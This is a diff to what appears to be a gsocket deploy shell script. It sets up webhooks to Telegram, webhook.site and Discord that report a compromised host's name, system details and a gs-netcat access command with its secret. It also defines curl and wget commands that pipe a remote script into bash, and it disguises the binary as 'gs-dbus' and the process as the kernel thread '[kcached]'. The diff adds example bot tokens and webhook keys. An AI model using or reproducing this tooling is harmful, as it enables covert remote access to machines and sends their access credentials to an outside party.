@@ -52,7 +52,7 @@
 # GS_TG_TOKEN
 #       - Telegram Bot ID, =5794110125:AAFDNb...
 # GS_TG_CHATID
-#        - Telegram Chat ID, =-8834838383
+#        - Telegram Chat ID, =-8834838...
 # GS_DISCORD_KEY
 #        - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
 # GS_WEBHOOK_KEY
@@ -71,19 +71,21 @@ URL_DEPLOY="${URL_BASE}/x"
 # WEBHOOKS are executed after a successfull install
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
-# GS_TG_TOKEN=""
-# GS_TG_CHATID=""
+# GS_TG_TOKEN="5794110125:AAFDNb..."
+# GS_TG_CHATID="-8834838..."
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
 }
-### webhook.site 
+### webhook.site
+# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 [[ -n $GS_WEBHOOK_KEY ]] && {
 	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
 ### discord webhook
+# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
@@ -92,11 +94,9 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 unset data
 unset msg
 
-# GS_VERSION=1.4.34
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-# DL_CMD="$DL_CRL"
-BIN_HIDDEN_NAME_DEFAULT=gs-dbus
+BIN_HIDDEN_NAME_DEFAULT="gs-dbus"
 # Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
 PROC_HIDDEN_NAME_DEFAULT="[kcached]"
 [[ -t 1 ]] && {
